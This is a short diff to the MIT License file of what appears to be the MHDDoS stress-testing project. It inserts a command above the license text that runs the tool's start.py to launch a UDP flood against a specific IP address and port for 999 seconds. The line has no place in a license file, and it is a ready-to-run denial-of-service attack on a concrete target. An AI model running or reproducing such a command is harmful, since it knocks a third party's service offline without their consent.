@@ -1,4 +1,6 @@
 MIT License
+python3 /workspaces/MHDDoS/start.py UDP 143.92.114.176:10015 53 999
+
 
 Copyright (c) 2024 MatrixTM
 
